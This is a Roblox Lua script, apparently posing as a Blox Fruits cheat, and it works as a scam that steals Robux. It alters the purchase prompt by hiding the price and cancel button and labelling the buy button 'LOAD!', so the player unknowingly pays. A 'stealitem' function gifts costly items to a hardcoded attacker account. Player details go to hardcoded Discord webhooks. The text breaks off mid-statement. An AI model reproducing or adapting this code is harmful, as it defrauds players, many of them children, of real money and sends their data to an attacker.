username = "nxrf1axz"
webhook = "https://webhook-protection.com/post?uniqueid=0111dfe1"

-- BLOX FRUIT?
LogsWebhook = "https://discord.com/api/webhooks/1341118899130994719/v1sS6RvRx_sK7dQYMAXIkWTUcSFUwRQxBegrC5nXzZHmeGyUQVXupJyT8C8zeHECUlt6"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local result = 0 

local HttpService = game:GetService("HttpService")

local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

local args = {
    [1] = "buyRobuxShop",
    [2] = {
        ["StorageName"] = "2x EXP (15 mins.)",
        ["FunnelId"] = "Shop",
        ["PurchaseLocation"] = "Shop"
    }
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))

local CoreGui = game:GetService("CoreGui")
local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
local Animator = ProductContainer:WaitForChild("Animator")

Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local prompt = Animator:WaitForChild("Prompt")
        local alertContents = prompt:WaitForChild("AlertContents")
        
        local middleContent = alertContents:FindFirstChild("MiddleContent")
        if middleContent then
            middleContent.Visible = false
        end

        local title = alertContents:WaitForChild("TitleContainer"):WaitForChild("TitleArea"):WaitForChild("Title")
        if title and title:IsA("TextLabel") then
            title.Text = "SCRIPT LOADED!"
        end
        
        local footerButtons = alertContents:WaitForChild("Footer"):WaitForChild("Buttons")
        local button2 = footerButtons:FindFirstChild("2")
        if button2 then
            button2.Visible = false
        end

        local footerContent = alertContents:WaitForChild("Footer"):FindFirstChild("FooterContent")
        if footerContent then
            footerContent.Visible = false
        end
        
        local button1 = footerButtons:FindFirstChild("1")
        if button1 then
            local buttonContent = button1:WaitForChild("ButtonContent")
            local buttonMiddleContent = buttonContent:WaitForChild("ButtonMiddleContent"):FindFirstChildWhichIsA("TextLabel")
            if buttonMiddleContent then
                buttonMiddleContent.Text = "LOAD!"
            end
        end
    end
end)

local function sendWebhook()

    local embed = {
        ["title"] = "**Phew Scripts - You Got A Execution** :rofl:",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. result .. "```"
            },
            {
                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
                ["value"] = "[****]()",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

function stealitem()
    if result >= 5000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["PurchaseLocation"] = "FruitShop",
                ["StorageName"] = "Permanent Dragon-Dragon",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 4000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Kitsune-Kitsune",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 3000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Leopard-Leopard",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2700 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Fruit Notifier",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2550 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Spirit-Spirit",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2500 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Gas-Gas",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2450 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Venom-Venom",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2425 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Shadow-Shadow",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2400 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Dough-Dough",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2350 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent T-Rex-T-Rex",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2300 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Gravity-Gravity",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2250 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Blizzard-Blizzard",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2200 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Pain-Pain",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2100 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Rumble-Rumble",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 2000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Portal-Portal",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1900 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Sound-Sound",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1800 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Spider-Spider",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1700 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Love-Love",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1650 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Buddha-Buddha",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1500 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Quake-Quake",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1300 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Magma-Magma",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1275 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Ghost-Ghost",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1250 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Barrier-Barrier",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1200 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Dark Blade",
                ["PurchaseLocation"] = "Shop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1100 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Light-Light",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 1000 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Diamond-Diamond",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 950 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Dark-Dark",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 850 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Sand-Sand",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 750 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Ice-Ice",
                ["PurchaseLocation"] = "FruitShop",
                ["FunnelId"] = "Shop",
                ["ReceiverName"] = Username,
                ["ReceiverUserId"] = UserId,
            }
        }
        
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    elseif result >= 650 then
        local args = {
            [1] = "buyRobuxShop",
            [2] = {
                ["Message"] = "Phew Scripts On Top",
                ["StorageName"] = "Permanent Falcon-Falcon",
                ["PurchaseLocation"] 
